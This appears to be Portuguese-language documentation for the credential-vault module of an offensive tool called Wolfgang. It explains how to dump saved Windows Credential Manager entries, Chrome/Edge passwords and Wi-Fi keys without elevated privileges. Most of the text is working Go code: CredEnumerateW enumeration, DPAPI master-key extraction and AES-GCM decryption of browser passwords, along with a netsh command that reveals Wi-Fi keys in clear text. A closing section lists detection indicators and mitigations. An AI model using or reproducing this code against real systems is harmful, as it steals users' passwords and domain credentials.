    Vault Extraction¶

    O que é¶

    O Windows Credential Manager (também chamado de Vault) é o repositório central do sistema operacional para credenciais salvas: senhas de sites (Internet Explorer/Edge), credenciais de rede (compartilhamentos SMB, RDP), e credenciais genéricas de aplicações.

    O módulo credential_vault do Wolfgang extrai credenciais de três fontes:

    • Credential Manager: Credenciais armazenadas via API CredWrite
    • Browsers (Chrome/Edge): Senhas salvas em SQLite, cifradas com DPAPI + AES-GCM
    • Wi-Fi: Perfis de rede wireless com senhas em claro

    A vantagem principal: não requer privilégio elevado. Credenciais do Credential Manager e browsers são acessíveis no contexto de segurança do usuário logado.

    Por que funciona¶

    Credential Manager¶

    O Windows armazena credenciais em arquivos cifrados com DPAPI (Data Protection API) no perfil do usuário. A DPAPI deriva a chave de descriptografia da senha do usuário logado -- portanto, qualquer processo rodando na sessão do usuário pode descriptografar essas credenciais chamando CredEnumerateW + CredRead.

    Os tipos de credencial são:

    Tipo Valor Descrição
    Generic 1 Credenciais de aplicações (ex: GitHub, Slack)
    Domain Password 2 Credenciais de domínio salvas (SMB, RDP)
    Domain Certificate 3 Certificados X.509 para autenticação
    Domain Visible Password 4 Senhas de domínio em formato legível

    Browser Passwords¶

    Chrome e Edge (Chromium) armazenam senhas em um banco SQLite (Login Data) com a coluna password_value cifrada. A partir do Chrome 80, o esquema é:

    1. Master key AES armazenada em Local State (JSON), cifrada com DPAPI
    2. Cada senha é cifrada com AES-256-GCM usando essa master key
    3. Formato: v10 ou v11 (3 bytes) + nonce (12 bytes) + ciphertext

    Wi-Fi Passwords¶

    O Windows armazena perfis Wi-Fi em XML, com senhas cifradas via DPAPI. O comando netsh wlan show profile name=X key=clear descriptografa automaticamente quando executado no contexto do SYSTEM ou do usuário que salvou o perfil.

    Implementação no Wolfgang¶

    Credential Manager: CredEnumerate¶

    func dumpCredentialManager() ([]StoredCredential, error) {
    var count uint32
    var creds **credential

    ret, _, err := procCredEnumerateW.Call(
        0, // filter: NULL = all
        0, // flags
        uintptr(unsafe.Pointer(&count)),
        uintptr(unsafe.Pointer(&creds)),
    )
    if ret == 0 {
        return nil, fmt.Errorf("CredEnumerateW failed: %w", err)
    }
    defer procCredFree.Call(uintptr(unsafe.Pointer(creds)))

    entries := unsafe.Slice(creds, count)
    result := make([]StoredCredential, 0, count)

    for _, c := range entries {
        target := windows.UTF16PtrToString(c.TargetName)
        username := windows.UTF16PtrToString(c.UserName)
        password := ""
        if c.CredentialBlobSize > 0 && c.CredentialBlob != nil {
            blob := unsafe.Slice(c.CredentialBlob, c.CredentialBlobSize)
            password = string(blob)
        }
        result = append(result, StoredCredential{
            Target: target, Username: username,
            Password: password, Type: credentialTypeString(c.Type),
        })
    }
    return result, nil
}

    A struct credential espelha a estrutura CREDENTIAL do Windows:

    type credential struct {
    Flags              uint32
    Type               uint32
    TargetName         *uint16
    Comment            *uint16
    LastWritten        windows.Filetime
    CredentialBlobSize uint32
    CredentialBlob     *byte
    Persist            uint32
    AttributeCount     uint32
    Attributes         uintptr
    TargetAlias        *uint16
    UserName           *uint16
}

    Browser: DPAPI + AES-GCM¶

    A extração de senhas de browser segue três etapas:

    1. Extrair master key do Local State:

    func extractMasterKey(localStatePath string) ([]byte, error) {
    data, _ := os.ReadFile(localStatePath)
    // Parse JSON -> os_crypt.encrypted_key
    decoded, _ := base64.StdEncoding.DecodeString(state.OSCrypt.EncryptedKey)
    stripped, _ := stripDPAPIPrefix(decoded) // Remove "DPAPI" prefix
    key, _ := dpapiDecrypt(stripped)         // CryptUnprotectData
    return key, nil
}

    2. Descriptografar via DPAPI (CryptUnprotectData):

    func dpapiDecrypt(ciphertext []byte) ([]byte, error) {
    inBlob := dataBlob{Size: uint32(len(ciphertext)), Data: &ciphertext[0]}
    var outBlob dataBlob

    ret, _, _ := procCryptUnprotect.Call(
        uintptr(unsafe.Pointer(&inBlob)),
        0, 0, 0, 0, 0,
        uintptr(unsafe.Pointer(&outBlob)),
    )
    // ...
}

    3. Descriptografar senha com AES-GCM:

    func decryptChromePassword(encrypted, masterKey []byte) (string, error) {
    nonce, ct, err := parseChromePassword(encrypted)
    if err != nil {
        // Pre-Chrome 80: DPAPI direto
        plain, _ := dpapiDecrypt(encrypted)
        return string(plain), nil
    }
    // Chrome 80+: AES-256-GCM
    block, _ := aes.NewCipher(masterKey)
    gcm, _ := cipher.NewGCM(block)
    plain, _ := gcm.Open(nil, nonce, ct, nil)
    return string(plain), nil
}

    Seleção de fontes¶

    O operador pode escolher qual fonte extrair via parâmetro source:

    Valor Fonte
    credman Apenas Credential Manager
    browser Apenas Chrome/Edge
    wifi Apenas perfis Wi-Fi
    all Todas as fontes (padrão)

    Detecção¶

    IOC Descrição
    Chamada a CredEnumerateW com filtro NULL Enumeração de todas as credenciais
    Acesso ao arquivo Local State de browser Leitura da master key
    Cópia do arquivo Login Data (SQLite) Extração do banco de senhas
    CryptUnprotectData em volume alto Descriptografia massiva via DPAPI
    netsh wlan show profile key=clear Extração de senhas Wi-Fi

    Mitigações:

    • Credential Guard: Protege credenciais de domínio do Credential Manager
    • Não salvar senhas no browser: Usar password manager externo
    • DPAPI com strong protection: Configurar CRED_PROTECT_STRONG para credenciais sensíveis
